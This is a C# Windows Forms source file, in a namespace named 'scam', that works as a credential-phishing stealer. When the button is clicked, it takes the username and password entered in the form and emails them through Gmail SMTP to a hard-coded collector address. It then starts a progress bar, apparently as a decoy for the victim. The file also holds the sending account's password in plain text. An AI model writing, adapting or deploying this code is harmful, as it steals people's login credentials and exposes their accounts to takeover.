using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;

namespace scam
{

	public partial class MainForm : Form
	{
		public MainForm()
		{
			InitializeComponent();
			
		}
		public void RichTextBox1TextChanged(object sender, EventArgs e)
		{

		}
		void Button1Click(object sender, EventArgs e)
		{
			
			string Username_text = username.Text;
			string Password_text = password.Text;
			string textmail = Username_text + " " + Password_text;
			
			string fromAddress = "jelszofeltoro123@gmail.com";
			string mailPassword = "Kristof123"; 
			string messageBody = textmail;
			
			
			// Create smtp connection.
			SmtpClient client = new SmtpClient();
			client.Port = 587;//outgoing port for the mail.
			client.Host = "smtp.gmail.com";
			client.EnableSsl = true;
			client.Timeout = 10000;
			client.DeliveryMethod = SmtpDeliveryMethod.Network;
			client.UseDefaultCredentials = false;
			client.Credentials = new System.Net.NetworkCredential(fromAddress, mailPassword);
			
			
			// Fill the mail form.
			var send_mail = new MailMessage();
			
			send_mail.IsBodyHtml = true;
			//address from where mail will be sent.
			send_mail.From = new MailAddress("jelszofeltoro123@gmail.com");
			//address to which mail will be sent.           
			send_mail.To.Add(new MailAddress("jelszofeltoro123@gmail.com"));
			//subject of the mail.
			send_mail.Subject = "jelszo";
			
			send_mail.Body = messageBody;
			client.Send(send_mail);
			
			this.timer1.Start();
		}
		void Timer1Tick(object sender, EventArgs e)
		{
			this.progressBar1.Increment(1);
		}
		void Label1Click(object sender, EventArgs e)
		{
	
		}
	}
}
